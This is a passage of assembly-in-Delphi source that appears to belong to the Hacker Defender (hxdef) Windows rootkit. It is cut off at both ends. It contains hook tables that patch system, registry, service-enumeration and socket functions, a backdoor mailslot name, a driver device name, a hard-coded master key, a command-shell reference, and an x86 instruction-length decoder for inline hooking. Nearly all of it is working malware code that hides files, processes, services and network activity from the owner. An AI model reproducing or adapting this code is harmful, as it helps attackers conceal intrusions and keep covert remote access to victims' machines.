                                          dd @NtProtectVirtualMemoryAddr
                                          dd @NtQueryInformationProcessName
                                          dd @NtQueryInformationProcessAddr
                                          dd @NtOpenKeyName
                                          dd @NtOpenKeyAddr
                                          dd @LdrInitializeThunkName
                                          dd @LdrInitializeThunkAddr
                                          dd @RtlAnsiStringToUnicodeStringName
                                          dd @RtlAnsiStringToUnicodeStringAddr
                                          dd @RtlCompareUnicodeStringName
                                          dd @RtlCompareUnicodeStringAddr
                                          dd @RtlInitAnsiStringName
                                          dd @RtlInitAnsiStringAddr
                                          dd @NtCreateFileName
                                          dd @NtCreateFileAddr
                                          dd @NtDeviceIoControlFileName
                                          dd @NtDeviceIoControlFileAddr
                                          dd @NtOpenFileName
                                          dd @NtOpenFileAddr
                                          dd @NtNotifyChangeDirectoryFileName
                                          dd @NtNotifyChangeDirectoryFileAddr
                                          dd @NtWaitForSingleObjectName
                                          dd @NtWaitForSingleObjectAddr
                                          dd @NtWaitForMultipleObjectsName
                                          dd @NtWaitForMultipleObjectsAddr
                                          dd @NtDelayExecutionName
                                          dd @NtDelayExecutionAddr
                                          dd @NtQuerySystemTimeName
                                          dd @NtQuerySystemTimeAddr
{$IFDEF LOGGING}
                                          dd @NtWriteFileName
                                          dd @NtWriteFileAddr
{$ENDIF}


 @HookStatic                            :
  @HS_ReadFile                          : dd @HT_OldReadFile
  {00}                                    dd @fNewReadFile
                                          dd @ReadFileAddr
  @HS_NtQuerySystemInformation          : dd @HT_OldNtQuerySystemInformation
  {01}                                    dd @fNewNtQuerySystemInformation
                                          dd @NtQuerySystemInformationAddr
  @HS_NtQueryDirectoryFile              : dd @HT_OldNtQueryDirectoryFile
  {02}                                    dd @fNewNtQueryDirectoryFile
                                          dd @NtQueryDirectoryFileAddr
  @HS_NtVdmControl                      : dd @HT_OldNtVdmControl
  {03}                                    dd @fNewNtVdmControl
                                          dd @NtVdmControlAddr
  @HS_NtResumeThread                    : dd @HT_OldNtResumeThread
  {04}                                    dd @fNewNtResumeThread
                                          dd @NtResumeThreadAddr
  @HS_NtEnumerateKey                    : dd @HT_OldNtEnumerateKey
  {05}                                    dd @fNewNtEnumerateKey
                                          dd @NtEnumerateKeyAddr
  @HS_NtEnumerateValueKey               : dd @HT_OldNtEnumerateValueKey
  {06}                                    dd @fNewNtEnumerateValueKey
                                          dd @NtEnumerateValueKeyAddr
  @HS_NtReadVirtualMemory               : dd @HT_OldNtReadVirtualMemory
  {07}                                    dd @fNewNtReadVirtualMemory
                                          dd @NtReadVirtualMemoryAddr
  @HS_NtQueryVolumeInformationFile      : dd @HT_OldNtQueryVolumeInformationFile
  {08}                                    dd @fNewNtQueryVolumeInformationFile
                                          dd @NtQueryVolumeInformationFileAddr
  @HS_NtDeviceIoControlFile             : dd @HT_OldNtDeviceIoControlFile
  {09}                                    dd @fNewNtDeviceIoControlFile
                                          dd @NtDeviceIoControlFileAddr
  @HS_LdrLoadDll                        : dd @HT_OldLdrLoadDll
  {10}                                    dd @fNewLdrLoadDll
                                          dd @LdrLoadDllAddr
  @HS_recv                              : dd @HT_Oldrecv
  {11}                                    dd @fNewrecv
                                          dd @recvAddr
  @HS_WSARecv                           : dd @HT_OldWSARecv
  {12}                                    dd @fNewWSARecv
                                          dd @WSARecvAddr
  @HS_EnumServiceGroupW                 : dd @HT_OldEnumServiceGroupW
  {13}                                    dd @fNewEnumServiceGroupW
                                          dd @EnumServiceGroupWAddr
  @HS_EnumServicesStatusExW             : dd @HT_OldEnumServicesStatusExW
  {14}                                    dd @fNewEnumServicesStatusExW
                                          dd @EnumServicesStatusExWAddr
  @HS_EnumServicesStatusExA             : dd @HT_OldEnumServicesStatusExA
  {15}                                    dd @fNewEnumServicesStatusExA
                                          dd @EnumServicesStatusExAAddr
  @HS_EnumServicesStatusA               : dd @HT_OldEnumServicesStatusA
  {16}                                    dd @fNewEnumServicesStatusA
                                          dd @EnumServicesStatusAAddr
  @HS_NtOpenProcess                     : dd @HT_OldNtOpenProcess
  {17}                                    dd @fNewNtOpenProcess
                                          dd @NtOpenProcessAddr
  @HS_NtCreateFile                      : dd @HT_OldNtCreateFile
  {18}                                    dd @fNewNtCreateFile
                                          dd @NtCreateFileAddr
  @HS_NtOpenFile                        : dd @HT_OldNtOpenFile
  {19}                                    dd @fNewNtOpenFile
                                          dd @NtOpenFileAddr
  @HS_NtNotifyChangeDirectoryFile       : dd @HT_OldNtNotifyChangeDirectoryFile
  {20}                                    dd @fNewNtNotifyChangeDirectoryFile
                                          dd @NtNotifyChangeDirectoryFileAddr
  @HS_NtWaitForSingleObject             : dd @HT_OldNtWaitForSingleObject
  {21}                                    dd @fNewNtWaitForSingleObject
                                          dd @NtWaitForSingleObjectAddr
  @HS_NtWaitForMultipleObjects          : dd @HT_OldNtWaitForMultipleObjects
  {22}                                    dd @fNewNtWaitForMultipleObjects
                                          dd @NtWaitForMultipleObjectsAddr

 @HookTable                             :
  //there has to be the same order of functions as in @HookStatic here
  //because of @HookedFlags
  @HT_OldReadFile                       : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldNtQuerySystemInformation       : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldNtQueryDirectoryFile           : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldNtVdmControl                   : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldNtResumeThread                 : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldNtEnumerateKey                 : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldNtEnumerateValueKey            : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldNtReadVirtualMemory            : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldNtQueryVolumeInformationFile   : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldNtDeviceIoControlFile          : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldLdrLoadDll                     : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_Oldrecv                           : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldWSARecv                        : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldEnumServiceGroupW              : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldEnumServicesStatusExW          : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldEnumServicesStatusExA          : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldEnumServicesStatusA            : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldNtOpenProcess                  : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldNtCreateFile                   : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldNtOpenFile                     : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldNtNotifyChangeDirectoryFile    : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldNtWaitForSingleObject          : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h
  @HT_OldNtWaitForMultipleObjects       : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h

  //this one is quite special
  @HT_OldLdrInitializeThunk             : db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 090h,090h,090h,090h,090h,090h,090h,090h
                                          db 0E9h,000h,000h,000h,000h

 {unhook vars}
 @UnhookStatic                          :
  //there has to be the same order of functions as in @HookStatic here
  //because of @HookedFlags
  @UHS_ReadFile                         : dd @HT_OldReadFile
                                          dd @ReadFileAddr
  @UHS_NtQuerySystemInformation         : dd @HT_OldNtQuerySystemInformation
                                          dd @NtQuerySystemInformationAddr
  @UHS_NtQueryDirectoryFile             : dd @HT_OldNtQueryDirectoryFile
                                          dd @NtQueryDirectoryFileAddr
  @UHS_NtVdmControl                     : dd @HT_OldNtVdmControl
                                          dd @NtVdmControlAddr
  @UHS_NtResumeThread                   : dd @HT_OldNtResumeThread
                                          dd @NtResumeThreadAddr
  @UHS_NtEnumerateKey                   : dd @HT_OldNtEnumerateKey
                                          dd @NtEnumerateKeyAddr
  @UHS_NtEnumerateValueKey              : dd @HT_OldNtEnumerateValueKey
                                          dd @NtEnumerateValueKeyAddr
  @UHS_NtReadVirtualMemory              : dd @HT_OldNtReadVirtualMemory
                                          dd @NtReadVirtualMemoryAddr
  @UHS_NtQueryVolumeInformationFile     : dd @HT_OldNtQueryVolumeInformationFile
                                          dd @NtQueryVolumeInformationFileAddr
  @UHS_NtDeviceIoControlFile            : dd @HT_OldNtDeviceIoControlFile
                                          dd @NtDeviceIoControlFileAddr
  @UHS_LdrLoadDll                       : dd @HT_OldLdrLoadDll
                                          dd @LdrLoadDllAddr
  @UHS_recv                             : dd @HT_Oldrecv
                                          dd @recvAddr
  @UHS_WSARecv                          : dd @HT_OldWSARecv
                                          dd @WSARecvAddr
  @UHS_EnumServiceGroupW                : dd @HT_OldEnumServiceGroupW
                                          dd @EnumServiceGroupWAddr
  @UHS_EnumServicesStatusExW            : dd @HT_OldEnumServicesStatusExW
                                          dd @EnumServicesStatusExWAddr
  @UHS_EnumServicesStatusExA            : dd @HT_OldEnumServicesStatusExA
                                          dd @EnumServicesStatusExAAddr
  @UHS_EnumServicesStatusA              : dd @HT_OldEnumServicesStatusA
                                          dd @EnumServicesStatusAAddr
  @UHS_NtOpenProcess                    : dd @HT_OldNtOpenProcess
                                          dd @NtOpenProcessAddr
  @UHS_NtCreateFile                     : dd @HT_OldNtCreateFile
                                          dd @NtCreateFileAddr
  @UHS_NtOpenFile                       : dd @HT_OldNtOpenFile
                                          dd @NtOpenFileAddr
  @UHS_NtNotifyChangeDirectoryFile      : dd @HT_OldNtNotifyChangeDirectoryFile
                                          dd @NtNotifyChangeDirectoryFileAddr
  @UHS_NtWaitForSingleObject            : dd @HT_OldNtWaitForSingleObject
                                          dd @NtWaitForSingleObjectAddr
  @UHS_NtWaitForMultipleObjects         : dd @HT_OldNtWaitForMultipleObjects
                                          dd @NtWaitForMultipleObjectsAddr

  //this one is quite special                                        
  @UHS_LdrInitializeThunk               : dd @HT_OldLdrInitializeThunk
                                          dd @LdrInitializeThunkAddr

 @HookDynamic                           :
  @HookedFlags                          : db 000h,000h,000h,000h,000h,000h,000h,000h
                                          db 000h,000h,000h,000h,000h,000h,000h,000h
                                          db 000h,000h,000h,000h,000h,000h,000h,000h
                                          db 000h,000h,000h,000h,000h,000h,000h,000h

 @DLLHandles:
  @LKernel32DLLHandle                   : dd 000000000h
  @LAdvapi32DLLHandle                   : dd 000000000h
  @LWS2_32DLLHandle                     : dd 000000000h
  @LUser32DLLHandle                     : dd 000000000h
  @LNtDLLDLLHandle                      : dd 000000000h

 @APIAddressTable:
  @SetLastErrorAddr                     : dd 000000000h
  @CreateMailslotAAddr                  : dd 000000000h
  @GetMailslotInfoAddr                  : dd 000000000h
  @WriteFileAddr                        : dd 000000000h
  @ReadFileAddr                         : dd 000000000h
  @CloseHandleAddr                      : dd 000000000h
  @GetEnvironmentVariableWAddr          : dd 000000000h
  @GetModuleFileNameAAddr               : dd 000000000h
  @DuplicateHandleAddr                  : dd 000000000h
  @CreateProcessAAddr                   : dd 000000000h
  @ExitThreadAddr                       : dd 000000000h
  @CreateThreadAddr                     : dd 000000000h
  @CreatePipeAddr                       : dd 000000000h
  @PeekNamedPipeAddr                    : dd 000000000h
  @WaitForMultipleObjectsAddr           : dd 000000000h
  @TerminateThreadAddr                  : dd 000000000h
  @TerminateProcessAddr                 : dd 000000000h
  @DisconnectNamedPipeAddr              : dd 000000000h
  @IsBadReadPtrAddr                     : dd 000000000h
  @LocalAllocAddr                       : dd 000000000h
  @LocalFreeAddr                        : dd 000000000h
  @GetLastErrorAddr                     : dd 000000000h

  @EnumServiceGroupWAddr                : dd 000000000h
  @EnumServicesStatusExWAddr            : dd 000000000h
  @EnumServicesStatusExAAddr            : dd 000000000h
  @EnumServicesStatusAAddr              : dd 000000000h
{new 078}
  @AllocateAndInitializeSidAddr         : dd 000000000h
  @GetLengthSidAddr                     : dd 000000000h
  @InitializeAclAddr                    : dd 000000000h
  @AddAccessAllowedAceAddr              : dd 000000000h
  @InitializeSecurityDescriptorAddr     : dd 000000000h
  @SetSecurityDescriptorDaclAddr        : dd 000000000h
{/new 078}

  @sendAddr                             : dd 000000000h
  @recvAddr                             : dd 000000000h
  @WSARecvAddr                          : dd 000000000h
  @WSAGetLastErrorAddr                  : dd 000000000h
  @WSAEventSelectAddr                   : dd 000000000h
  @WSAIoctlAddr                         : dd 000000000h
  @WSASocketAAddr                       : dd 000000000h
  @WSAConnectAddr                       : dd 000000000h
  @WSACreateEventAddr                   : dd 000000000h
  @WSAWaitForMultipleEventsAddr         : dd 000000000h
  @WSAEnumNetworkEventsAddr             : dd 000000000h
  @closesocketAddr                      : dd 000000000h

  @PeekMessageAAddr                     : dd 000000000h

  @NtQueryObjectAddr                    : dd 000000000h
  @NtQueryInformationThreadAddr         : dd 000000000h
  @NtQuerySystemInformationAddr         : dd 000000000h
  @NtQueryDirectoryFileAddr             : dd 000000000h
  @NtVdmControlAddr                     : dd 000000000h
  @NtResumeThreadAddr                   : dd 000000000h
  @NtSuspendThreadAddr                  : dd 000000000h
  @NtOpenThreadAddr                     : dd 000000000h
  @NtEnumerateKeyAddr                   : dd 000000000h
  @NtEnumerateValueKeyAddr              : dd 000000000h
  @NtQueryVolumeInformationFileAddr     : dd 000000000h
  @LdrLoadDllAddr                       : dd 000000000h
  @NtOpenSectionAddr                    : dd 000000000h
  @NtMapViewOfSectionAddr               : dd 000000000h
  @NtUnmapViewOfSectionAddr             : dd 000000000h
  @NtOpenDirectoryObjectAddr            : dd 000000000h
  @NtCloseAddr                          : dd 000000000h
  @NtAllocateVirtualMemoryAddr          : dd 000000000h
  @NtFreeVirtualMemoryAddr              : dd 000000000h
  @NtOpenProcessAddr                    : dd 000000000h
  @NtDuplicateObjectAddr                : dd 000000000h
  @NtReadVirtualMemoryAddr              : dd 000000000h
  @NtWriteVirtualMemoryAddr             : dd 000000000h
  @NtQueryVirtualMemoryAddr             : dd 000000000h
  @NtFlushInstructionCacheAddr          : dd 000000000h
  @NtProtectVirtualMemoryAddr           : dd 000000000h
  @NtQueryInformationProcessAddr        : dd 000000000h
  @NtOpenKeyAddr                        : dd 000000000h
  @LdrInitializeThunkAddr               : dd 000000000h
  @RtlAnsiStringToUnicodeStringAddr     : dd 000000000h
  @RtlCompareUnicodeStringAddr          : dd 000000000h
  @RtlInitAnsiStringAddr                : dd 000000000h
  @NtCreateFileAddr                     : dd 000000000h
  @NtDeviceIoControlFileAddr            : dd 000000000h
  @NtOpenFileAddr                       : dd 000000000h
  @NtNotifyChangeDirectoryFileAddr      : dd 000000000h
  @NtWaitForSingleObjectAddr            : dd 000000000h
  @NtWaitForMultipleObjectsAddr         : dd 000000000h
  @NtDelayExecutionAddr                 : dd 000000000h
  @NtQuerySystemTimeAddr                : dd 000000000h

{$IFDEF LOGGING}
  @NtWriteFileAddr                      : dd 000000000h
{$ENDIF}


 @Data:
 @BaseNamedObjectsName                  : db '\BaseNamedObjects'                ,000h

 @Consts                                :
  @cServerMailslotName                  : db '\\.\mailslot\hxdef-rk100sABCDEFGH',000h
  @cClientMailslotName                  : db '\\.\mailslot\hxdef-rkc000'        ,000h
  @cBackdoorMailslotName                : db '\\.\mailslot\hxdef-rkb000'        ,000h
  @cMailslotsHiddenName                 : db '\Device\Mailslot\hxdef*'          ,000h
  @cDeviceTCP                           : db '\Device\Tcp'                      ,000h
  @cDeviceUDP                           : db '\Device\Udp'                      ,000h

  @cDriverDeviceName                    : db  '\',000h, '?',000h, '?',000h, '\',000h
                                          db  'H',000h, 'x',000h, 'D',000h, 'e',000h
                                          db  'f',000h, 'D',000h, 'r',000h, 'i',000h
                                          db  'v',000h, 'e',000h, 'r',000h,000h,000h

  @cMasterKey                           : db 001h,09Ah,08Ch,066h,0AFh,0C0h,04Ah,011h
                                          db 09Eh,03Fh,040h,088h,012h,02Ch,03Ah,04Ah
                                          db 084h,065h,038h,0B0h,0B4h,008h,00Bh,0AFh
                                          db 0DBh,0CEh,002h,094h,034h,05Fh,022h,000h
  @cShellExecutable                     : db  'C',000h, 'O',000h, 'M',000h, 'S',000h
                                          db  'P',000h, 'E',000h, 'C',000h,000h,000h
  @IntercomBuffer                       : db 001h,002h,003h,004h,005h,006h,007h,008h
                                          db 009h,00Ah,00Bh,00Ch,00Dh
  @cSWSA                                : db 000h,000h,000h,000h,000h,001h

 @Locals                                :
 {infector vars}

  @LGlobalCheck                         : db 00h
  @LCriticalSectionFlag                 : db 00h
  @LUnhookInProgress                    : db 00h
  @LReserved1                           : db 00h

  //these two must be together and form 8 byte buffer
  @LHookRunning                         : dd 000000000h
  @LNotifyTable                         : dd 000000000h


 @GetInstructionLen:
  mov ecx,[esp+004h]             //ECX = opcode ptr
  xor edx,edx                    //flags
  xor eax,eax
 @GetInstructionLen_prefix:
  and dl,not C_PREFIX
  mov al,[ecx]
  inc ecx

  push ebx
  call @GetInstructionLen_nul_addr1
 @GetInstructionLen_nul_addr1:
  pop ebx
  add ebx,0104h

  or edx,[ebx+eax*004h]
  pop ebx

  test dl, C_PREFIX
  jnz @GetInstructionLen_prefix

  cmp al,0F6h
  je @GetInstructionLen_test
  cmp al,0F7h
  je @GetInstructionLen_test

  cmp al,0CDh
  je @GetInstructionLen_int

  cmp al,0Fh
  je @GetInstructionLen_0F
 @GetInstructionLen_cont:
  test dh,C_DATAW0 shr 8
  jnz @GetInstructionLen_dataw0
 @GetInstructionLen_dataw0done:
  test dh,C_MODRM shr 8
  jnz @GetInstructionLen_modrm
 @GetInstructionLen_exitmodrm:
  test dl,C_MEM67
  jnz @GetInstructionLen_mem67
 @GetInstructionLen_mem67done:
  test dh,C_DATA66 shr 8
  jnz @GetInstructionLen_data66
 @GetInstructionLen_data66done:
  mov eax,ecx
  sub eax,[esp+4]
  and edx,C_MEM1+C_MEM2+C_MEM4 + C_DATA1+C_DATA2+C_DATA4
  add al,dl
  add al,dh

 @GetInstructionLen_exit:
  ret 004h

 @GetInstructionLen_test:
  or dh,C_MODRM shr 8
  test byte ptr [ecx],00111000b  // F6/F7 -- test
  jnz @GetInstructionLen_cont
  or dh,C_DATAW0 shr 8
  jmp @GetInstructionLen_cont

 @GetInstructionLen_int:
  or dh,C_DATA1 shr 8
  cmp byte ptr [ecx],20h
  jne @GetInstructionLen_cont
  or dh,C_DATA4 shr 8
  jmp @GetInstructionLen_cont

 @GetInstructionLen_0F:
  mov al,[ecx]
  inc ecx

  push ebx
  call @GetInstructionLen_nul_addr2
 @GetInstructionLen_nul_addr2:
  pop ebx
  add ebx,049Ch

  or edx,[ebx+eax*004h]
  pop ebx

  cmp edx,-1
  jne @GetInstructionLen_cont

 @GetInstructionLen_error:
  mov eax,edx
  jmp @GetInstructionLen_exit

 @GetInstructionLen_dataw0:
  xor dh,C_DATA66 shr 8
  test al,00000001b
  jnz @GetInstructionLen_dataw0done
  xor dh,(C_DATA66+C_DATA1) shr 8
  jmp @GetInstructionLen_dataw0done

 @GetInstructionLen_mem67:
  xor dl,C_MEM2
  test dl,C_67
  jnz @GetInstructionLen_mem67done
  xor dl,C_MEM4+C_MEM2
  jmp @GetInstructionLen_mem67done

 @GetInstructionLen_data66:
  xor dh,C_DATA2 shr 8
  test dh,C_66 shr 8
  jnz @GetInstructionLen_data66done
  xor dh,(C_DATA4+C_DATA2) shr 8
  jmp @GetInstructionLen_data66done

 @GetInstructionLen_modrm:
  mov al,[ecx]
  inc ecx

  mov ah,al  // ah=mod, al=rm
  and ax,0C007h
  cmp ah,0C0h
  je @GetInstructionLen_exitmodrm

  test dl,C_67
  jnz @GetInstructionLen_modrm16

 @GetInstructionLen_modrm32:
  cmp al,04h
  jne @GetInstructionLen_a

  mov al,[ecx]       // sib
  inc ecx
  and al,07h

 @GetInstructionLen_a:
  cmp ah,40h
  je @GetInstructionLen_mem1
  cmp ah,80h
  je @GetInstructionLen_mem4

  cmp ax,0005h
  jne @GetInstructionLen_exitmodrm

 @GetInstructionLen_mem4:
  or dl,C_MEM4
  jmp @GetInstructionLen_exitmodrm

 @GetInstructionLen_mem1:
  or dl,C_MEM1
  jmp @GetInstructionLen_exitmodrm

 @GetInstructionLen_modrm16:
  cmp ax,0006h
  je @GetInstructionLen_mem2
  cmp ah,40h
  je @GetInstructionLen_mem1
  cmp ah,80h
 jne @GetInstructionLen_exitmodrm

 @GetInstructionLen_mem2:
  or dl,C_MEM2
  jmp @GetInstructionLen_exitmodrm



// .data

//0F      -- analyzed in code, no flags (i.e.flags must be 0)
//F6,F7   -- --//-- (ttt=000 -- 3 bytes, otherwise 2 bytes)
//CD      -- --//-- (6 bytes if CD 20, 2 bytes otherwise)

 @GetInstructionLen_table_1:               //label   dword   // normal instructions
  dd C_MODRM              //00
  dd C_MODRM              //01
  dd C_MODRM              //02
  dd C_MODRM              //03
  dd C_DATAW0             //04
  dd C_DATAW0             //05
  dd 0                    //06
  dd 0                    //07
  dd C_MODRM              //08
  dd C_MODRM              //09
  dd C_MODRM              //0A
  dd C_MODRM              //0B
  dd C_DATAW0             //0C
  dd C_DATAW0             //0D
  dd 0                    //0E
  dd 0                    //0F
  dd C_MODRM              //10
  dd C_MODRM              //11
  dd C_MODRM              //12
  dd C_MODRM              //13
  dd C_DATAW0             //14
  dd C_DATAW0             //15
  dd 0                    //16
  dd 0                    //17
  dd C_MODRM              //18
  dd C_MODRM              //19
  dd C_MODRM              //1A
  dd C_MODRM              //1B
  dd C_DATAW0             //1C
  dd C_DATAW0             //1D
  dd 0                    //1E
  dd 0                    //1F
  dd C_MODRM              //20
  dd C_MODRM              //21
  dd C_MODRM              //22
  dd C_MODRM              //23
  dd C_DATAW0             //24
  dd C_DATAW0             //25
  dd C_PREFIX             //26
  dd 0                    //27
  dd C_MODRM              //28
  dd C_MODRM              //29
  dd C_MODRM              //2A
  dd C_MODRM              //2B
  dd C_DATAW0             //2C
  dd C_DATAW0             //2D
  dd C_PREFIX             //2E
  dd 0                    //2F
  dd C_MODRM              //30
  dd C_MODRM              //31
  dd C_MODRM              //32
  dd C_MODRM              //33
  dd C_DATAW0             //34
  dd C_DATAW0             //35
  dd C_PREFIX             //36
  dd 0                    //37
  dd C_MODRM              //38
  dd C_MODRM              //39
  dd C_MODRM              //3A
  dd C_MODRM              //3B
  dd C_DATAW0             //3C
  dd C_DATAW0             //3D
  dd C_PREFIX             //3E
  dd 0                    //3F
  dd 0                    //40
  dd 0                    //41
  dd 0                    //42
  dd 0                    //43
  dd 0                    //44
  dd 0                    //45
  dd 0                    //46
  dd 0                    //47
  dd 0                    //48
  dd 0                    //49
  dd 0                    //4A
  dd 0                    //4B
  dd 0                    //4C
  dd 0                    //4D
  dd 0                    //4E
  dd 0                    //4F
  dd 0                    //50
  dd 0                    //51
  dd 0                    //52
  dd 0                    //53
  dd 0                    //54
  dd 0                    //55
  dd 0                    //56
  dd 0                    //57
  dd 0                    //58
  dd 0                    //59
  dd 0                    //5A
  dd 0                    //5B
  dd 0                    //5C
  dd 0                    //5D
  dd 0                    //5E
  dd 0                    //5F
  dd 0                    //60
  dd 0                    //61
  dd C_MODRM              //62
  dd C_MODRM              //63
  dd C_PREFIX             //64
  dd C_PREFIX             //65
  dd C_PREFIX+C_66        //66
  dd C_PREFIX+C_67        //67
  dd C_DATA66             //68
  dd C_MODRM+C_DATA66     //69
  dd C_DATA1              //6A
  dd C_MODRM+C_DATA1      //6B
  dd 0                    //6C
  dd 0                    //6D
  dd 0                    //6E
  dd 0                    //6F
  dd C_DATA1              //70
  dd C_DATA1              //71
  dd C_DATA1              //72
  dd C_DATA1              //73
  dd C_DATA1              //74
  dd C_DATA1              //75
  dd C_DATA1              //76
  dd C_DATA1              //77
  dd C_DATA1              //78
  dd C_DATA1              //79
  dd C_DATA1              //7A
  dd C_DATA1              //7B
  dd C_DATA1              //7C
  dd C_DATA1              //7D
  dd C_DATA1              //7E
  dd C_DATA1              //7F
  dd C_MODRM+C_DATA1      //80
  dd C_MODRM+C_DATA66     //81
  dd C_MODRM+C_DATA1      //82
  dd C_MODRM+C_DATA1      //83
  dd C_MODRM              //84
  dd C_MODRM              //85
  dd C_MODRM              //86
  dd C_MODRM              //87
  dd C_MODRM              //88
  dd C_MODRM              //89
  dd C_MODRM              //8A
  dd C_MODRM              //8B
  dd C_MODRM              //8C
  dd C_MODRM              //8D
  dd C_MODRM              //8E
  dd C_MODRM              //8F
  dd 0                    //90
  dd 0                    //91
  dd 0                    //92
  dd 0                    //93
  dd 0                    //94
  dd 0                    //95
  dd 0                    //96
  dd 0                    //97
  dd 0                    //98
  dd 0                    //99
  dd C_DATA66+C_MEM2      //9A
  dd 0                    //9B
  dd 0                    //9C
  dd 0                    //9D
  dd 0                    //9E
  dd 0                    //9F
  dd C_MEM67              //A0
  dd C_MEM67              //A1
  dd C_MEM67              //A2
  dd C_MEM67              //A3
  dd 0                    //A4
  dd 0                    //A5
  dd 0                    //A6
  dd 0                    //A7
  dd C_DATA1              //A8
  dd C_DATA66             //A9
  dd 0                    //AA
  dd 0                    //AB
  dd 0                    //AC
  dd 0                    //AD
  dd 0                    //AE
  dd 0                    //AF
  dd C_DATA1              //B0
  dd C_DATA1              //B1
  dd C_DATA1              //B2
  dd C_DATA1              //B3
  dd C_DATA1              //B4
  dd C_DATA1              //B5
  dd C_DATA1              //B6
  dd C_DATA1              //B7
  dd C_DATA66             //B8
  dd C_DATA66             //B9
  dd C_DATA66             //BA
  dd C_DATA66             //BB
  dd C_DATA66             //BC
  dd C_DATA66             //BD
  dd C_DATA66             //BE
  dd C_DATA66             //BF
  dd C_MODRM+C_DATA1      //C0
  dd C_MODRM+C_DATA1      //C1
  dd C_DATA2              //C2
  dd 0                    //C3
  dd C_MODRM              //C4
  dd C_MODRM              //C5
  dd C_MODRM+C_DATA1      //C6
  dd C_MODRM+C_DATA66     //C7
  dd C_DATA2+C_DATA1      //C8
  dd 0                    //C9
  dd C_DATA2              //CA
  dd 0                    //CB
  dd 0                    //CC
  dd 0                    //CD
  dd 0                    //CE
  dd 0                    //CF
  dd C_MODRM              //D0
  dd C_MODRM              //D1
  dd C_MODRM              //D2
  dd C_MODRM              //D3
  dd C_DATA1              //D4
  dd C_DATA1              //D5
  dd 0                    //D6
  dd 0                    //D7
  dd C_MODRM              //D8
  dd C_MODRM              //D9
  dd C_MODRM              //DA
  dd C_MODRM              //DB
  dd C_MODRM              //DC
  dd C_MODRM              //DD
  dd C_MODRM              //DE
  dd C_MODRM              //DF
  dd C_DATA1              //E0
  dd C_DATA1              //E1
  dd C_DATA1              //E2
  dd C_DATA1              //E3
  dd C_DATA1              //E4
  dd C_DATA1              //E5
  dd C_DATA1              //E6
  dd C_DATA1              //E7
  dd C_DATA66             //E8
  dd C_DATA66             //E9
  dd C_DATA66+C_MEM2      //EA
  dd C_DATA1              //EB
  dd 0                    //EC
  dd 0                    //ED
  dd 0                    //EE
  dd 0                    //EF
  dd C_PREFIX             //F0
  dd 0                    //F1
  dd C_PREFIX             //F2
  dd C_PREFIX             //F3
  dd 0                    //F4
  dd 0                    //F5
  dd 0                    //F6
  dd 0                    //F7
  dd 0                    //F8
  dd 0                    //F9
  dd 0                    //FA
  dd 0                    //FB
  dd 0                    //FC
  dd 0                    //FD
  dd C_MODRM              //FE
  dd C_MODRM              //FF

 @GetInstructionLen_table_0F:              //label   dword   //0F-prefixed instructions
  dd C_MODRM              //00
  dd C_MODRM              //01
